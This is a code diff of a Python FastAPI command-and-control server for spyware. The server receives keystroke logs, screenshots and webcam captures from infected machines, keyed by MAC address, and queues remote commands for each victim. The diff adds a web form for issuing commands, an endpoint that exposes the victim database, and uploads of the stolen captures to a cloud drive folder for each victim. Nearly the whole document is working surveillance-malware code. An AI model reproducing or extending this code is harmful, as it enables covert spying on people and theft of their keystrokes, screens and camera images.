@@ -1,12 +1,36 @@
 import uvicorn
 import json
 import os
-from fastapi import FastAPI, Request
+from fastapi import FastAPI, Request, Form
+from fastapi.responses import HTMLResponse
 from typing import Dict, List
+import base64
+from driveapi import create_folder, upload_file_from_file
 
 app = FastAPI()
-ROOT_DIR = os.getcwd()
 DB_NAME = 'db.json'
+TEMP_FILE = 'temp'
+
+
+@app.get('/')
+async def root():
+    with open('source_files/index.html', 'r') as file:
+        return HTMLResponse(file.read())
+
+
+@app.get('/db.json')
+async def db_json():
+    return load_db()
+
+
+@app.post('/add_command')
+async def add_command(mac_address: str = Form(default=None),
+                      commands: str = Form(default="")):
+    db = load_db()
+    db[mac_address]['commands'] += commands.split(',')
+    write_db(db)
+    with open('source_files/commands_added.html', 'r') as file:
+        return HTMLResponse(file.read())
 
 
 @app.get('/first_command')
@@ -35,35 +59,35 @@ async def command(request: Request) -> Dict[str, List[str]]:
 
 @app.post('/keylog_data')
 async def keylog(request: Request) -> None:
-    data = await request.body()
-    data = data.replace(b'\x00', b'')
-    db = load_db()
-    mac = request.headers['MAC-Address']
-    with open(f'{ROOT_DIR}/{mac}/log{db[mac]["keylogs_received"]}.txt', 'wb') as f:
-        f.write(data)
-    db[mac]['keylogs_received'] += 1
-    write_db(db)
+    await upload_file(request, 'log', 'keylogs_received', 'txt', True)
 
 
 @app.post('/screenshot')
 async def screenshot(request: Request) -> None:
-    await save_image(request, 'screenshot', 'screenshots_taken')
+    file_type = request.headers['Content-Type'].split('/')[1]
+    await upload_file(request, 'screenshot', 'screenshots_taken', file_type, False)
 
 
 @app.post('/webcam_capture')
 async def webcam_capture(request: Request) -> None:
-    await save_image(request, 'webcam', 'webcam_shots_taken')
+    file_type = request.headers['Content-Type'].split('/')[1]
+    await upload_file(request, 'webcam', 'webcam_shots_taken', file_type, False)
 
 
-async def save_image(request: Request, filename: str, db_identifier: str) -> None:
+async def upload_file(request: Request, filename: str, db_identifier: str,
+                      file_type: str, remove_nulls: bool) -> None:
     data = await request.body()
+    if remove_nulls:
+        data = data.replace(b'\x00', b'')
     mac = request.headers['MAC-Address']
     db = load_db()
-    image_type = request.headers['Content-Type'].split('/')[1]
-    with open(f'{ROOT_DIR}/{mac}/{filename}{db[mac][db_identifier]}.{image_type}', 'wb') as f:
+    title = f'{filename}{db[mac][db_identifier]}.{file_type}'
+    with open(TEMP_FILE, 'wb') as f:
         f.write(data)
     db[mac][db_identifier] += 1
     write_db(db)
+    upload_file_from_file(title=title, src_filename=TEMP_FILE,
+                          mime_type=request.headers['Content-Type'], parent=mac)
 
 
 def load_db() -> dict:
@@ -80,14 +104,13 @@ def write_db(db: dict) -> None:
 def initialize_new_client(mac_address: str, datetime: str, db: dict) -> None:
     db[mac_address] = {
         'commands': [],
-        'dir': f'{ROOT_DIR}\\{mac_address}',
         'last_datetime': datetime,
         'screenshots_taken': 0,
         'webcam_shots_taken': 0,
         'keylogs_received': 0
     }
-    os.mkdir(f'{ROOT_DIR}\\{mac_address}')
     write_db(db)
+    create_folder(mac_address)
 
 
 def get_commands(mac_address: str, db: dict) -> Dict[str, List[str]]:
@@ -101,5 +124,5 @@ def get_commands(mac_address: str, db: dict) -> Dict[str, List[str]]:
 
 
 if __name__ == '__main__':
-    uvicorn.run(app, host='0.0.0.0', port=30050)
+    uvicorn.run('main:app', host='0.0.0.0', port=int(os.environ.get("PORT", 30050)), workers=2, debug=True)
 # uvicorn main:app --reload
